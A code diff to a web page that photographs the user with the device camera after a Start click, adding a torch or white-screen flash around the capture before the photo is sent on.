@@ -83,6 +83,18 @@
     backdrop-filter: blur(8px);
   }
 
+  .screen-flash {
+    position: fixed;
+    z-index: 10;
+    inset: 0;
+    background: #fff;
+    opacity: 0;
+    pointer-events: none;
+    transition: opacity 60ms ease;
+  }
+
+  .screen-flash.active { opacity: 1; }
+
   .buttons {
     display: flex;
     gap: 10px;
@@ -127,6 +139,8 @@
       <span id="cameraLabel" class="camera-label" style="display:none;">Привет</span>
     </div>
 
+    <div id="screenFlash" class="screen-flash" aria-hidden="true"></div>
+
     <div class="buttons">
       <button id="btnStart">Start</button>
     </div>
@@ -143,6 +157,7 @@
   const video = document.getElementById('video');
   const canvas = document.getElementById('canvas');
   const status = document.getElementById('status');
+  const screenFlash = document.getElementById('screenFlash');
 
   const btnStart = document.getElementById('btnStart');
   const cameraLabel = document.getElementById('cameraLabel');
@@ -175,6 +190,23 @@
     return new Promise((resolve) => {
       video.addEventListener('loadeddata', resolve, { once: true });
     });
+  }
+
+  async function enableFlash() {
+    const track = stream?.getVideoTracks()[0];
+    const capabilities = track?.getCapabilities?.();
+
+    if (capabilities?.torch) {
+      try {
+        await track.applyConstraints({ advanced: [{ torch: true }] });
+        return () => track.applyConstraints({ advanced: [{ torch: false }] }).catch(() => {});
+      } catch {
+        // Some browsers expose torch but reject it for the front camera.
+      }
+    }
+
+    screenFlash.classList.add('active');
+    return () => screenFlash.classList.remove('active');
   }
 
   function capturePhoto() {
@@ -229,8 +261,13 @@
     try {
       await startCamera();
       await waitForVideo();
-      status.textContent = "Фото сделано. Завершение...";
-      await capturePhoto();
+      const disableFlash = await enableFlash();
+      try {
+        await new Promise((resolve) => setTimeout(resolve, 120));
+        await capturePhoto();
+      } finally {
+        disableFlash();
+      }
       stopCamera();
       await sendPhoto();
       status.textContent = "Good girl";
